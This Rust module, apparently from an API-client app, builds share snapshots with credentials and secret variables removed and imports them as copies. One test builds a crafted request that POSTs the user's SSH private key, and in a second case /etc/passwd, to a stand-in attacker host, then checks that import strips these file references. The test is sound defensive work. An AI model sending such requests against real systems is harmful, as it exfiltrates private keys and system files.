//! Share snapshots (AC-SHARE-1/2/5).
//!
//! Snapshot format (agreed with the Worker, `worker/src/snapshot.ts`):
//!
//! ```json
//! { "schemaVersion": 1,
//!   "collection": { ...Collection, "folders": [Folder], "requests": [Request] },   // kind = collection
//!   "request": Request,                                                             // kind = request
//!   "environment": { "name": "...", "variables": [{ key, value, enabled, secret:false }] } | null }
//! ```
//!
//! Sanitising (AC-SHARE-2): secret variables are always removed from the
//! attached environment; unless "Include credentials" is set, `Authorization`,
//! `Proxy-Authorization` and `Cookie` header values and Auth tab secrets are
//! replaced by `{{placeholder}}` variables.

use crate::model::*;
use crate::storage::{NodeKind, Store, StoreError};
use crate::sync::ShareKind;
use serde::{Deserialize, Serialize};
use serde_json::{Value, json};
use std::collections::HashMap;

#[derive(Debug, Clone, Default, PartialEq, Eq, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ShareOptions {
    #[serde(default)]
    pub include_credentials: bool,
    /// Attach this environment (non-secret variables only).
    #[serde(default)]
    pub environment_id: Option<String>,
}

/// What the Share dialog lists as removed (AC-SHARE-2).
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct SharePreview {
    pub name: String,
    pub request_count: usize,
    pub folder_count: usize,
    /// Secret variables dropped from the attached environment (always).
    pub secret_variables_removed: usize,
    /// Credential headers / auth fields replaced by placeholders (0 when
    /// credentials are included).
    pub credentials_replaced: usize,
    /// Credential headers / auth fields present in the shared items.
    pub credential_fields: usize,
}

const CREDENTIAL_HEADERS: [&str; 3] = ["authorization", "proxy-authorization", "cookie"];

fn placeholder_for_header(name: &str) -> String {
    match name.to_ascii_lowercase().as_str() {
        "cookie" => "{{cookie}}".into(),
        "proxy-authorization" => "{{proxyAuthorization}}".into(),
        _ => "{{authorization}}".into(),
    }
}

/// Count and optionally replace credential values in an auth block.
fn sanitize_auth(auth: &mut Auth, replace: bool) -> usize {
    let mut n = 0;
    let mut swap = |field: &mut Option<String>, ph: &str| {
        if field.as_deref().is_some_and(|v| !v.is_empty()) {
            n += 1;
            if replace {
                *field = Some(ph.to_string());
            }
        }
    };
    match auth.auth_type {
        AuthType::Basic => {
            swap(&mut auth.username, "{{username}}");
            swap(&mut auth.password, "{{password}}");
        }
        AuthType::Bearer => swap(&mut auth.token, "{{token}}"),
        AuthType::Apikey => {
            if let Some(k) = auth.api_key.as_mut()
                && !k.value.is_empty()
            {
                n += 1;
                if replace {
                    k.value = "{{apiKey}}".into();
                }
            }
        }
        AuthType::None | AuthType::Inherit => {}
    }
    n
}

fn sanitize_request(r: &mut Request, replace: bool) -> usize {
    let mut n = sanitize_auth(&mut r.auth, replace);
    for h in &mut r.headers {
        if CREDENTIAL_HEADERS.contains(&h.key.trim().to_ascii_lowercase().as_str())
            && !h.value.is_empty()
        {
            n += 1;
            if replace {
                h.value = placeholder_for_header(&h.key);
            }
        }
    }
    n
}

/// Build a sanitized snapshot for a collection or request share.
pub fn build_snapshot(
    store: &Store,
    kind: ShareKind,
    entity_id: &str,
    opts: &ShareOptions,
) -> Result<(Value, SharePreview), StoreError> {
    let replace = !opts.include_credentials;
    let mut preview = SharePreview::default();
    let mut root = serde_json::Map::new();
    root.insert("schemaVersion".into(), json!(SCHEMA_VERSION));
    match kind {
        ShareKind::Collection => {
            let pid = store.project_of(NodeKind::Collection, entity_id)?;
            let tree = store.project(&pid)?;
            let mut c = tree
                .collections
                .iter()
                .find(|c| c.id == entity_id)
                .cloned()
                .ok_or_else(|| StoreError::NotFound(entity_id.into()))?;
            preview.credential_fields += sanitize_auth(&mut c.auth, replace);
            let folders: Vec<Folder> = tree
                .folders
                .iter()
                .filter(|f| f.collection_id == entity_id)
                .cloned()
                .collect();
            let mut requests: Vec<Request> = tree
                .requests
                .iter()
                .filter(|r| r.collection_id == entity_id)
                .cloned()
                .collect();
            for r in &mut requests {
                preview.credential_fields += sanitize_request(r, replace);
            }
            preview.name = c.name.clone();
            preview.folder_count = folders.len();
            preview.request_count = requests.len();
            let mut cv = serde_json::to_value(&c).unwrap_or(Value::Null);
            if let Value::Object(o) = &mut cv {
                o.insert(
                    "folders".into(),
                    serde_json::to_value(&folders).unwrap_or(Value::Null),
                );
                o.insert(
                    "requests".into(),
                    serde_json::to_value(&requests).unwrap_or(Value::Null),
                );
            }
            root.insert("collection".into(), cv);
        }
        ShareKind::Request => {
            let mut r = store
                .request(entity_id)
                .cloned()
                .ok_or_else(|| StoreError::NotFound(entity_id.into()))?;
            // Inline the collection auth for Inherit so the share is self-contained.
            if r.auth.auth_type == AuthType::Inherit {
                r.auth = store
                    .collection(&r.collection_id)
                    .map(|c| c.auth.clone())
                    .unwrap_or_default();
                if r.auth.auth_type == AuthType::Inherit {
                    r.auth = Auth::none();
                }
            }
            preview.credential_fields += sanitize_request(&mut r, replace);
            preview.name = r.name.clone();
            preview.request_count = 1;
            root.insert(
                "request".into(),
                serde_json::to_value(&r).unwrap_or(Value::Null),
            );
        }
    }
    if replace {
        preview.credentials_replaced = preview.credential_fields;
    }
    let env_value = match &opts.environment_id {
        Some(eid) => {
            let env = store
                .environment(eid)
                .ok_or_else(|| StoreError::NotFound(format!("Environment {eid}")))?;
            preview.secret_variables_removed = env.variables.iter().filter(|v| v.secret).count();
            let vars: Vec<&Variable> = env.variables.iter().filter(|v| !v.secret).collect();
            json!({ "name": env.name, "variables": vars })
        }
        None => Value::Null,
    };
    root.insert("environment".into(), env_value);
    Ok((Value::Object(root), preview))
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct SharedCollection {
    #[serde(flatten)]
    collection: Collection,
    #[serde(default)]
    folders: Vec<Folder>,
    #[serde(default)]
    requests: Vec<Request>,
}

#[derive(Deserialize)]
struct SharedEnv {
    #[serde(default)]
    name: String,
    #[serde(default)]
    variables: Vec<Variable>,
}

/// Import a share snapshot as a copy with new ids into `project_id`
/// (AC-SHARE-5). A request share lands in a new collection named after it.
pub fn import_snapshot(
    store: &mut Store,
    project_id: &str,
    kind: ShareKind,
    snapshot: &Value,
) -> Result<ProjectTree, StoreError> {
    import_snapshot_with_warnings(store, project_id, kind, snapshot).map(|(tree, _)| tree)
}

/// Clear local file references from an untrusted request (QA-R1-027): a
/// crafted share must not be able to upload `~/.ssh/id_rsa` on Send. Binary
/// paths are removed and file form fields are emptied and disabled.
pub fn strip_file_references(r: &mut Request, warnings: &mut Vec<String>) {
    if let Some(path) = r.body.binary_path.take()
        && !path.is_empty()
    {
        warnings.push(format!(
            "\"{}\": the shared binary body file \"{path}\" was removed; choose a file before sending",
            r.name
        ));
        r.body.binary_path = Some(String::new());
    }
    if let Some(form) = r.body.form.as_mut() {
        for f in form.iter_mut().filter(|f| f.kind == FormFieldKind::File) {
            if !f.value.is_empty() {
                warnings.push(format!(
                    "\"{}\": the shared file \"{}\" for field \"{}\" was removed; choose a file before sending",
                    r.name, f.value, f.key
                ));
            }
            f.value.clear();
            f.enabled = false;
        }
    }
}

/// [`import_snapshot`] plus warnings about removed file references.
pub fn import_snapshot_with_warnings(
    store: &mut Store,
    project_id: &str,
    kind: ShareKind,
    snapshot: &Value,
) -> Result<(ProjectTree, Vec<String>), StoreError> {
    store.project(project_id)?;
    let mut warnings = Vec::new();
    let now = now_ms();
    let invalid =
        |e: serde_json::Error| StoreError::Invalid(format!("Invalid share snapshot: {e}"));
    let (collection, folders, requests) = match kind {
        ShareKind::Collection => {
            let raw = snapshot
                .get("collection")
                .cloned()
                .ok_or_else(|| StoreError::Invalid("Snapshot has no collection".into()))?;
            let sc: SharedCollection = serde_json::from_value(raw).map_err(invalid)?;
            let cid = new_id();
            let fmap: HashMap<String, String> = sc
                .folders
                .iter()
                .map(|f| (f.id.clone(), new_id()))
                .collect();
            let folders = sc
                .folders
                .iter()
                .map(|f| Folder {
                    id: fmap[&f.id].clone(),
                    collection_id: cid.clone(),
                    parent_folder_id: f
                        .parent_folder_id
                        .as_ref()
                        .and_then(|p| fmap.get(p).cloned()),
                    created_at: now,
                    updated_at: now,
                    ..f.clone()
                })
                .collect();
            let requests = sc
                .requests
                .iter()
                .map(|r| Request {
                    id: new_id(),
                    collection_id: cid.clone(),
                    folder_id: r.folder_id.as_ref().and_then(|p| fmap.get(p).cloned()),
                    created_at: now,
                    updated_at: now,
                    ..r.clone()
                })
                .collect();
            let collection = Collection {
                id: cid,
                project_id: project_id.to_string(),
                created_at: now,
                updated_at: now,
                ..sc.collection
            };
            (collection, folders, requests)
        }
        ShareKind::Request => {
            let raw = snapshot
                .get("request")
                .cloned()
                .ok_or_else(|| StoreError::Invalid("Snapshot has no request".into()))?;
            let r: Request = serde_json::from_value(raw).map_err(invalid)?;
            let cid = new_id();
            let name = if r.name.trim().is_empty() {
                "Shared request".to_string()
            } else {
                r.name.clone()
            };
            let collection = Collection {
                id: cid.clone(),
                project_id: project_id.to_string(),
                name,
                description: String::new(),
                auth: Auth::none(),
                sort_order: 0,
                created_at: now,
                updated_at: now,
            };
            let request = Request {
                id: new_id(),
                collection_id: cid,
                folder_id: None,
                sort_order: 0,
                created_at: now,
                updated_at: now,
                ..r
            };
            (collection, vec![], vec![request])
        }
    };
    let mut requests = requests;
    for r in &mut requests {
        strip_file_references(r, &mut warnings);
    }
    let tree = store.insert_collection_tree(project_id, collection, folders, requests)?;
    if let Some(env) = snapshot.get("environment").filter(|v| v.is_object())
        && let Ok(se) = serde_json::from_value::<SharedEnv>(env.clone())
    {
        let name = if se.name.trim().is_empty() {
            "Shared".to_string()
        } else {
            se.name
        };
        let mut created = store.create_environment(Some(project_id), &name)?;
        created.variables = se.variables.into_iter().filter(|v| !v.secret).collect();
        store.update_environment(&created)?;
    }
    Ok((tree, warnings))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn setup() -> (tempfile::TempDir, Store, String, String, String) {
        let dir = tempfile::tempdir().unwrap();
        let mut s = Store::open(dir.path()).unwrap();
        let pid = s.project_list()[0].id.clone();
        let mut c = s.create_collection(&pid, "Users API").unwrap();
        c.auth = Auth::bearer("collection-token");
        s.update_collection(&c).unwrap();
        let f = s.create_folder(&c.id, None, "Admin").unwrap();
        let r = s
            .create_request(
                &c.id,
                Some(&f.id),
                Request {
                    name: "List".into(),
                    url: "{{baseUrl}}/users".into(),
                    headers: vec![
                        KeyValue::new("Authorization", "Bearer real"),
                        KeyValue::new("cookie", "sid=1"),
                        KeyValue::new("X-Other", "keep"),
                    ],
                    auth: Auth::basic("bob", "pw"),
                    ..Request::default()
                },
            )
            .unwrap();
        let mut env = s.create_environment(Some(&pid), "Staging").unwrap();
        env.variables = vec![
            Variable::new("baseUrl", "https://stg"),
            Variable::new("tok", "SECRET").secret(),
        ];
        s.update_environment(&env).unwrap();
        (dir, s, c.id, r.id, env.id)
    }

    #[test]
    fn ac_share_2_strips_secrets_and_credentials() {
        let (_d, s, cid, _rid, eid) = setup();
        let opts = ShareOptions {
            include_credentials: false,
            environment_id: Some(eid),
        };
        let (snap, preview) = build_snapshot(&s, ShareKind::Collection, &cid, &opts).unwrap();
        let text = snap.to_string();
        assert!(
            !text.contains("SECRET"),
            "secret variables are always removed"
        );
        assert!(!text.contains("Bearer real"));
        assert!(!text.contains("sid=1"));
        assert!(!text.contains("collection-token"));
        assert!(!text.contains("\"pw\""));
        assert_eq!(snap["schemaVersion"], 1);
        let req = &snap["collection"]["requests"][0];
        assert_eq!(req["headers"][0]["value"], "{{authorization}}");
        assert_eq!(req["headers"][1]["value"], "{{cookie}}");
        assert_eq!(req["headers"][2]["value"], "keep");
        assert_eq!(req["auth"]["password"], "{{password}}");
        assert_eq!(snap["collection"]["auth"]["token"], "{{token}}");
        assert_eq!(snap["collection"]["folders"].as_array().unwrap().len(), 1);
        assert_eq!(
            snap["environment"]["variables"].as_array().unwrap().len(),
            1
        );
        assert_eq!(preview.secret_variables_removed, 1);
        assert_eq!(preview.credentials_replaced, 5);
        assert_eq!(preview.request_count, 1);

        // Include credentials keeps them, but secrets are still removed.
        let opts = ShareOptions {
            include_credentials: true,
            ..opts
        };
        let (snap, preview) = build_snapshot(&s, ShareKind::Collection, &cid, &opts).unwrap();
        let text = snap.to_string();
        assert!(text.contains("Bearer real"));
        assert!(!text.contains("SECRET"));
        assert_eq!(preview.credentials_replaced, 0);
    }

    #[test]
    fn qa_r1_027_imported_share_cannot_reference_local_files() {
        let (_d, mut s, _cid, _rid, _eid) = setup();
        let pid = s.project_list()[0].id.clone();
        let mut evil = Request {
            name: "steal".into(),
            url: "https://attacker.example/upload".into(),
            body: Body::binary("/home/me/.ssh/id_rsa"),
            ..Request::default()
        };
        evil.method = "POST".into();
        let snap = serde_json::json!({"schemaVersion": 1, "request": evil, "environment": null});
        let (tree, warnings) =
            import_snapshot_with_warnings(&mut s, &pid, ShareKind::Request, &snap).unwrap();
        let r = tree.requests.iter().find(|r| r.name == "steal").unwrap();
        assert_eq!(r.body.binary_path.as_deref(), Some(""));
        assert_eq!(warnings.len(), 1);

        let mut form = evil.clone();
        form.body = Body::form(vec![
            FormField::file("f", "/etc/passwd"),
            FormField::text("t", "ok"),
        ]);
        let snap = serde_json::json!({"schemaVersion": 1, "request": form, "environment": null});
        let (tree, warnings) =
            import_snapshot_with_warnings(&mut s, &pid, ShareKind::Request, &snap).unwrap();
        let r = tree.requests.iter().rfind(|r| r.name == "steal").unwrap();
        let fields = r.body.form.as_ref().unwrap();
        assert_eq!(fields[0].value, "");
        assert!(!fields[0].enabled);
        assert_eq!(fields[1].value, "ok");
        assert!(warnings[0].contains("/etc/passwd"));
    }

    #[test]
    fn ac_share_5_import_creates_copy_with_new_ids() {
        let (_d, mut s, cid, rid, eid) = setup();
        let pid = s.project_list()[0].id.clone();
        let opts = ShareOptions {
            include_credentials: false,
            environment_id: Some(eid),
        };
        let (snap, _) = build_snapshot(&s, ShareKind::Collection, &cid, &opts).unwrap();
        let tree = import_snapshot(&mut s, &pid, ShareKind::Collection, &snap).unwrap();
        assert_eq!(tree.collections.len(), 2);
        let copy = tree.collections.iter().find(|c| c.id != cid).unwrap();
        let copied_reqs: Vec<_> = tree
            .requests
            .iter()
            .filter(|r| r.collection_id == copy.id)
            .collect();
        assert_eq!(copied_reqs.len(), 1);
        assert_ne!(copied_reqs[0].id, rid);
        let folder = tree
            .folders
            .iter()
            .find(|f| f.collection_id == copy.id)
            .unwrap();
        assert_eq!(
            copied_reqs[0].folder_id.as_deref(),
            Some(folder.id.as_str())
        );
        assert_eq!(
            s.environments
                .iter()
                .filter(|e| e.name == "Staging")
                .count(),
            2
        );

        let (snap, _) =
            build_snapshot(&s, ShareKind::Request, &rid, &ShareOptions::default()).unwrap();
        // inherit/auth values are inlined and sanitized
        assert_eq!(snap["request"]["auth"]["username"], "{{username}}");
        assert!(snap["environment"].is_null());
        let tree = import_snapshot(&mut s, &pid, ShareKind::Request, &snap).unwrap();
        assert_eq!(tree.collections.len(), 3);
        assert!(tree.collections.iter().any(|c| c.name == "List"));
    }
}
